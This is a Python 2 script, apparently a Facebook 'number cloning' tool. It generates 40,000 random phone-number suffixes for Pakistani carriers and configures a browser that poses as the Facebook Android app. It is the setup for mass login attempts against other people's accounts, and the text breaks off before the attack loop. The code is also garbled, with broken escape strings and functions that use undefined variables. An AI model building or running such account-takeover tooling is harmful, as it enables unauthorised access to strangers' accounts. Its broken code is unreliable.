# coding: utf-8

# Decompiled By Rafsan

# Facebook : https://www.facebook.com/arifislam512623

# uncompyle6 version 

# Original written By Rafsan

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'Rafsan'

__copyright = 'All rights reserved . Copyright  Rafsan 69'

CorrectUsername = 'Rafsan'

CorrectPassword = 'Rafsan69'

os.system('clear')

loop = 'true'

while (loop == 'true'):

    username = raw_input('\33[1;91mENTER TOOL KEYâ€¦â€¦â€¦â€¦=>> :\33[1;93m ')

    if (username == CorrectUsername):

            print '\33[1;92m Logged in successfully as '

            time.sleep(1)

            os.system('xdg-open https://www.facebook.com/broken.tah')

            os.system('clear')

            loop = 'false'

    else:

        print '\33[1;93m Wrong Key !'

        os.system('xdg-open https://www.facebook.com/broken.tah')

        os.system('clear')

done = False

os.system('rm -rf .txt')

for n in range(40000):

    nmbr = random.randint(1111111, 9999999)

    sys.stdout = open('.txt', 'a')

    print nmbr

    sys.stdout.flush()

try:

    import requests

except ImportError:

    os.system('pip2 install requests')

try:

    import mechanize

except ImportError:

    os.system('pip2 install mechanize')

    time.sleep(1)

    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():

    print '[!] Exit Successfully '

    os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x = x.replace('!%s' % i, '\1b[%s;1m' % str(31 + j))

    x += '\1b[0m'

    x = x.replace('!0', '\1b[0m')

    sys.stdout.write(x + '\')

def jalan(x):

    for e in x + '\':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(3.0 / 200)

def tik():

    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']

    for o in titik:

        print '\\1b[1;96m \1b[1;96m               Load\1b[1;96ming\1b[1;0m\1b[1;96m' + o,

        sys.stdout.flush()

        time.sleep(0.5)

 ##### LOGO ##### 

logo = """

 
___________________________         

                               
   (          )   *   )     )  
   )\      ( /( ` )  /(  ( /(  
((((_)(    )\()) ( )(_)) )\()) 
 )\ _ )\  ((_)\ (_(_()) ((_)\  
 (_)_\(_)| | (_)|_   _||__  /  
  / _ \  |_  _|   | |    / /   
 /_/ \_\   |_|    |_|   /_/ 
                                    
Assalamu Alaikum ðŸ˜Š
 ______________________________________________

 Author   :           Rafsan 

 Facebook :          Rafsan Ahmed 

 GitHub   :        Jerry-Allen

 Version  :              0.2

 ______________________________________________

                                                  """ 

logo1 = '   \\\1b[4;96mSELECT PAK  SIM CODE \1b[1;0m\\1b[1;96m[1] Jazz    \1b[1;97m 00,01,02,03,04,05,06,07,08\\1b[1;96m[2] Zong    \1b[1;97m 11,12,13,14,15,16,17\\1b[1;96m[3] Warid   \1b[1;97m 21,22,23,24,25\\1b[1;96m[4] Ufone   \1b[1;97m 30,31,32,33,34,35\\1b[1;96m[5] Telenor \1b[1;97m 40,41,42,43,44,45,46,47\\\\\1bx \1b[1;97m\1b[1;0m\'

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

cpb = []

def menu():

    os.system('clear')

    print logo

    print(47*'-')

    print

    jalan ('\1b[1;96m[1] START Manual Number Cloning ')

    print

    print ('\1b[1;96m[0] TOOL LOGOUT')

    print

    print(47*'-')

    action()

def action():

    global cpb

    global oks

    ss = raw_input('\1b[1;96mselect Optoin =   ')

    if ss == '':

        print '[!] Warning'

        action()

    elif ss == '1':

        tik()

        os.system('clear')

        print logo

        print logo1

        try:

            c = raw_input('\1b[1;97mCODE : ')

            k = '03'

            idlist = '.txt'

            for line in open(idlist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '[!] File Not Found'

            raw_input('\[ Back ]')

            menu()

    elif ss == '0':

        exb()

        login()

    else:

        print '[!] Fill In Correctly'

        action()

    os.system('clear')

    print logo

    jalan ('\1b[1;97mUse without Internet Sim and.minimize termux and check every 10 minutes  later. airplane mode use every 10 mi
